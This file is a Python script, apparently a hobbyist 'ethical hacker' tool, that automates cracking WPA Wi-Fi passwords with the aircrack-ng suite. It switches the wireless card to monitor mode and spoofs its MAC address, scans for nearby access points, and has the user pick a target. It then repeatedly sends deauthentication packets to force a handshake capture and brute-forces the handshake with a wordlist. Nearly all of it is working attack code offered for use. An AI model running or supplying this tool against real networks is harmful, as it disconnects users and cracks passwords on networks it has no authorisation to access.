#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Ethical H4CK3R
#
import os
import sys
import csv
import time
import argparse
import threading
from subprocess import *

class Engine(object):
  def __init__(self,iface,desti='list-01.csv'):
    self.num  = 0
    self.time = 8
    self.mac  = []
    self.ssid = []
    self.chan = [] 
    self.clnt = []
    self.data = []
    self.csv  = desti
    self.wlan = iface 
    self.live = True
        
  def Monitor(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','monitor'])
    Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull)
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','stop'])

  def Managed(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','managed'])
    Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull)
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','restart'])
    
  def Scan(self):
    self.Clean('csv')
    cmd=['airodump-ng','-a','--output-format','csv', '-w','list',self.wlan]
    Popen(cmd,stderr=Devnull,stdout=Devnull)
     
  def Accesspoints(self):
    with open(self.csv, 'r') as AccessPoints:
     Data = csv.reader(AccessPoints,delimiter=',')

     for line in Data:
      if len(line) >= 10:
       chan  = str(line[3]).strip()
       bssid = str(line[0]).strip()
       power = str(line[8]).strip()
       essid = str(line[13]).strip()

       if essid != 'ESSID' and len(essid) and bssid not in self.mac:
        client = 'yes' if bssid in self.clnt else 'no'
        if not len(self.mac):
         print self.Alpha()

        print self.Beta(bssid,client,power,essid)
        time.sleep(.2)
        self.Append(bssid,chan,essid)
        self.num+=1

  def Alpha(self):
    call(['clear'])
    data = '#\t  Bssid\t\tClient\t Power\tEssid'
    self.data.append(data)
    return data

  def Beta(self,bssid,client,power,essid):
    if self.num > 9:
     data = '{}  {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
    else:
     data = '{}   {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
    self.data.append(data)
    return data

  def Append(self,bssid,chan,ssid):
    self.mac.append(bssid)
    self.chan.append(chan)
    self.ssid.append(ssid)
        
  def Clients_file(self):
    with open(self.csv,'r') as Clients:
     Data = csv.reader(Clients,delimiter=',')
     self.Clients_list(Data)

  def Clients_list(self,file):
    for line in file:
     if len(line) == 7:
      client = line[5]
      if client[3] == ':' and client not in self.clnt: 
       self.clnt.append(client.strip())
  
  def Display(self):
    self.Clients_file()
    self.Accesspoints()
         
  def Clean(self,end):
    for item in os.listdir('.'):
     if item.endswith('.{}'.format(end)):
      os.remove(item)

  def User(self): 
    if not len(self.data):
     self.Managed()
     self.Exit()

    size=len(self.mac)-1
    call(['clear'])

    for data in self.data:
     print data
    try:
     Index = raw_input('\n[-] Enter a number: ')
     Index = int(Index)

     if Index > size:
      self.User()
     
     return self.mac[Index],self.ssid[Index],self.chan[Index]
    except KeyboardInterrupt:
     self.Managed()
     self.Exit()
    
  def Handshake(self,mac,ssid,chan):
    self.Clean('cap')
    self.ObtainInfo(ssid,mac,chan)
    
    while self.live:
     call(['clear'])
     print('[-] Scanning: {}...'.format(ssid)) 

     attack = threading.Thread(target=(self.Attack),args=[mac])
     attack.start()
    
     while attack.is_alive():pass
     time.sleep(1)

     analyze = threading.Thread(target=(self.Analyze),args=[ssid])
     analyze.start()
   
     while analyze.is_alive():pass
     time.sleep(.1)

  def Analyze(self,ssid):
    cmd=['aircrack-ng','{}-01.cap'.format(ssid)]
    Authentic = Popen(cmd,stderr=PIPE,stdout=PIPE)
    Authentic.wait()

    for output in Authentic.communicate():
     call(['clear'])
     print('[-] Scanning: {}...'.format(ssid)) 
     
     if 'Choosing first network as target' in output:
      if '1 handshake' in output:
       Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
       self.live = False  
     
  def Attack(self,mac):
    cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.wlan]
    Popen(cmd,stdout=Devnull,stderr=Devnull).wait()

  def ObtainInfo(self,ssid,mac,chan):
    cmd=['airodump-ng','--bssid',mac,'--essid',ssid,'-c',chan,'--ignore-negative-one','--output-format','cap','-w','{}'.format(ssid),self.wlan]
    Popen(cmd,stdout=Devnull,stderr=Devnull) 
    time.sleep(.5)

  def Aircrack(self,handshake,wordlist):
    cmd=['aircrack-ng',handshake,'-w',wordlist]
    Popen(cmd).wait()

  def Exit(self):
    self.Clean('csv')
    self.Clean('cap')
    call(['clear'])
    exit()
       
def Main():
  # Assign Arugments
  UserArgs = argparse.ArgumentParser() 
  UserArgs.add_argument('wordlist',help='path to wordlist')
  UserArgs.add_argument('interface',help='wireless interface')
  Args = UserArgs.parse_args()
 
  # Assign Variables
  cwd = os.getcwd()
  wlan = Args.interface
  engine = Engine(wlan)
  wordlist = Args.wordlist
 
  # Validate Wordlist
  if not os.path.exists(wordlist):
   call(['clear'])
   exit('[!] Unable to locate: {}'.format(wordlist))
  
  # Change Directory 
  os.chdir('/tmp')

  # Enable Monitor Mode
  engine.Monitor()
  call(['clear'])
  print '[-] Scanning ...'

  # Scan For Accesspoints
  try:
   engine.Scan()
   time.sleep(2.5)
  except KeyboardInterrupt:
   engine.Exit()

  # Display File
  while 1:
   try:
    engine.Display()
    time.sleep(.5)
   except KeyboardInterrupt:
    Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
    break
    
  # User 
  Input = engine.User()
  bssid = Input[0]
  essid = Input[1] 
  chan  = Input[2]
  
  # Obtain Handshake
  try:
   engine.Handshake(bssid,essid,chan)
  except KeyboardInterrupt:
   Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
   engine.Exit()
  
  # Disable Monitor Mode
  engine.Managed()
 
  # Full Path To Handshake
  handshake = '{}/{}-01.cap'.format(os.getcwd(),essid)

  # Change Directory
  os.chdir(cwd)
  
  # Start Aircrack
  try:
   engine.Aircrack(handshake,wordlist)
  finally:
   cmd=['pkill','aircrack-ng']
   Popen(cmd).wait()
   os.chdir('/tmp')
   engine.Exit()
  
if __name__ =='__main__':
 if os.getuid():
  exit('[!] Root Access Required')

 if sys.platform != 'linux2':
  exit('[!] Kali Linux 2.0 Required')

 Devnull = open(os.devnull, 'w')
 Main()
